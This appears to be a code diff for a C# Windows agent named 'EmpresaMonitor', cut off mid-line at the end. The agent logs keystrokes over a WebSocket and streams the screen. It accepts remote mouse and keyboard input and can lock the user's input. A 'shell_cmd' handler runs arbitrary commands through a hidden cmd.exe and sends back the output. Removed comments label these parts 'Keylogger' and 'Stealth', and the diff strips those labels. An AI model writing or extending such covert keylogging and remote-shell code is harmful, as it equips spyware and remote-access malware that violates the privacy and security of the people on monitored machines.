@@ -20,18 +20,20 @@ namespace EmpresaMonitor.Agent
     {
         [STAThread] static void Main() { _ = StartEngine(); Application.Run(); }
 
+        // --- CLASSES DE ESTADO E CONFIGURAÇÃO ---
         public class AgentState {
             public bool AccessActive = true, StreamRequested = true, ControlActive = true, SessionAuthorized = true, IsReady = false;
             public StreamSettings Settings = StreamSettings.Balanced;
             public ClientWebSocket? Socket; public SemaphoreSlim? SendGate;
-            public DateTime? LastBlockTime = null; // Para o Watchdog de segurança
+            public DateTime? LastBlockTime = null;
         }
 
-        // --- APIs do Windows ---
+        // --- APIs DO WINDOWS (IMPORTANTE: APENAS UMA VEZ) ---
         [DllImport("user32.dll")] static extern void mouse_event(uint f, uint x, uint y, uint d, UIntPtr e);
         [DllImport("user32.dll")] static extern void keybd_event(byte v, byte s, uint f, UIntPtr e);
         [DllImport("user32.dll")] static extern bool BlockInput(bool fBlockIt);
 
+        // --- MOTOR PRINCIPAL ---
         static async Task StartEngine() {
             var lifetime = new CancellationTokenSource();
             var agentId = LoadOrCreateId();
@@ -39,14 +41,12 @@ namespace EmpresaMonitor.Agent
             var sendGate = new SemaphoreSlim(1, 1);
             var state = new AgentState { Socket = socket, SendGate = sendGate };
 
-            // Inicialização do Keylogger
             KeyboardHook.Install(async (k, d) => {
                 if (state.Socket?.State == WebSocketState.Open && state.IsReady) {
                     await SendKeylog(state.Socket, sendGate, k, d, state);
                 }
             });
 
-            // Loop de Captura de Tela (Background)
             _ = Task.Run(() => CaptureLoop(lifetime, agentId, socket, sendGate, state));
 
             while (!lifetime.IsCancellationRequested) {
@@ -90,24 +90,14 @@ namespace EmpresaMonitor.Agent
                         case "stream_profile": st.Settings = StreamSettings.FromId(root.TryGetProperty("profile", out var p) ? p.GetString() : null); break;
                         case "stream_start": st.StreamRequested = true; break;
                         case "stream_stop": st.StreamRequested = false; break;
-
-                        // --- NOVOS COMANDOS DE CONTROLE ---
-                        case "control_input": // Mouse/Teclado Remoto
-                            if (st.ControlActive && root.TryGetProperty("event", out var ev)) ApplyControlEvent(ev); 
-                            break;
-
-                        case "input_lock": // Bloqueio de Teclado/Mouse (Estratégia Elegante)
-                            if (root.TryGetProperty("active", out var activeProp)) {
-                                bool active = activeProp.GetBoolean();
-                                await SetInputLock(active, s, g, st);
-                            }
-                            break;
-
-                        case "shell_cmd": // Execução de Comandos de Sistema (Stealth)
+                        
+                        // NOVOS COMANDOS
+                        case "control_input": if (st.ControlActive && root.TryGetProperty("event", out var ev)) ApplyControlEvent(ev); break;
+                        case "input_lock": await SetInputLock(root.GetProperty("active").GetBoolean(), s, g, st); break;
+                        case "shell_cmd": 
                             if (root.TryGetProperty("cmd", out var cmdProp)) {
-                                string cmd = cmdProp.GetString();
-                                string result = await ExecuteShellSilent(cmd);
-                                await SendJsonAsync(s, g, new { type = "shell_result", output = result, cmd = cmd });
+                                string result = await ExecuteShellSilent(cmdProp.GetString());
+                                await SendJsonAsync(s, g, new { type = "shell_result", output = result });
                             }
                             break;
                     }
@@ -115,55 +105,43 @@ namespace EmpresaMonitor.Agent
             }
         }
 
-        // --- MÓDULO DE EXECUÇÃO SILENCIOSA (SHELL) ---
         static async Task<string> ExecuteShellSilent(string command) {
             return await Task.Run(() => {
                 try {
                     var startInfo = new ProcessStartInfo {
-                        FileName = "cmd.exe",
-                        Arguments = $"/c {command}",
-                        RedirectStandardOutput = true,
-                        RedirectStandardError = true,
-                        UseShellExecute = false,
-                        CreateNoWindow = true,
-                        WindowStyle = ProcessWindowStyle.Hidden
+                        FileName = "cmd.exe", Arguments = $"/c {command}",
+                        RedirectStandardOutput = true, RedirectStandardError = true,
+                        UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden
                     };
                     using var process = new Process { StartInfo = startInfo };
                     process.Start();
-                    if (process.WaitForExit(15000)) { // Timeout de 15s
+                    if (process.WaitForExit(15000)) {
                         string output = process.StandardOutput.ReadToEnd();
                         string error = process.StandardError.ReadToEnd();
                         return string.IsNullOrEmpty(error) ? output : $"Error: {error}";
                     }
-                    process.Kill();
-                    return "Timeout: Comando demorou muito.";
+                    process.Kill(); return "Timeout";
                 } catch (Exception ex) { return $"Exception: {ex.Message}"; }
             });
         }
 
-        // --- MÓDULO DE BLOQUEIO DE INPUT (LOCK) ---
         static async Task SetInputLock(bool lockStatus, ClientWebSocket s, SemaphoreSlim g, AgentState st) {
             try {
                 BlockInput(lockStatus);
                 if (lockStatus) {
                     st.LastBlockTime = DateTime.Now;
-                    // Watchdog de segurança: destrava após 30s se o comando de destravar não chegar
                     _ = Task.Run(async () => {
-                        await Task.Delay(30000); 
+                        await Task.Delay(30000);
                         if (st.LastBlockTime.HasValue) {
-                            BlockInput(false);
-                            st.LastBlockTime = null;
-                            await SendJsonAsync(s, g, new { type = "lock_timeout", status = "unlocked_by_safety" });
+                            BlockInput(false); st.LastBlockTime = null;
+                            await SendJsonAsync(s, g, new { type = "lock_timeout" });
                         }
                     });
-                } else {
-                    st.LastBlockTime = null;
-                }
+                } else { st.LastBlockTime = null; }
                 await SendJsonAsync(s, g, new { type = "lock_ack", status = lockStatus });
             } catch { }
         }
 
-        // --- MÓDULO DE CAPTURA DE TELA ---
         static async Task CaptureLoop(CancellationTokenSource lt, string id, ClientWebSocket s, SemaphoreSlim g, AgentState st) {
             var codec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.FormatID == ImageFormat.Jpeg.Guid);
             Bitmap? f = null, sc = null; Graphics? fg = null, sg = null; EncoderParameters? ep = null; MemoryStream? ms = null;
@@ -236,5 +214,13 @@ namespace EmpresaMonitor.Agent
         }
     }
 
-    // ... (Restante das classes StreamSettings e KeyboardHook permanecem iguais)
-}
+    // --- CLASSES AUXILIARES (PARA NÃO DAR ERRO DE NAMESPACE) ---
+
+    public class StreamSettings {
+        public string Name { get; set; }
+        public string Id { get; set; }
+        public int Width { get; set; }
+        public int Fps { get; set; }
+        public long Quality { get; set; }
+        public StreamSettings(string n, string i, int w, int f, long q) { Name = n; Id = i; Width = w; Fps = f; Quality = q; }
+        public static readonly StreamSettings Fluid = new("Fluido", "fluid", 1280, 30,
